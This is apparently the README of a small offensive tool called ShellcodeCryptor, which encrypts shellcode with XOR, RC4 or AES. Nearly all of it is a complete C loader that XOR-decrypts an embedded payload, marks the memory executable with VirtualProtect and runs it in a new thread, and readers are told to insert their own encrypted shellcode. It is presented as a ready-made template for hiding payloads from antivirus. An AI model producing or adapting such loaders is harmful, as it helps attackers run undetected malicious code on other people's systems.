# ShellcodeCryptor
Stupid little tool to encrypt/decrypt shellcode

Encrypt shellcode files using XOR, RC4, and AES


To utilize your encrypted shellcode in a loader, just re-implement the decryption logic on your shellcode buffer within your loader. Listed below are working examples:

### XOR
```c
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>

void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j;

    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}

void shellcode() {
    void* exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    // XOR key
    unsigned char key[] = "s3cr3t";

    // Replace with your own encrypted shellcode
    unsigned char buf[] = { 0x90, 0x90, 0x90 };
    unsigned int payload_len = sizeof(buf);

    // Allocate a memory buffer for payload
    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    XOR((char*)buf, payload_len, key, sizeof(key));

    // Copy payload to new buffer
    RtlMoveMemory(exec_mem, buf, payload_len);

    // Make new buffer as executable
    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

    // If all good, run the payload
    if (rv != 0) {
        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }
}

int main(int argc, char* argv[]) {
  shellcode();

  return 0;
}
```
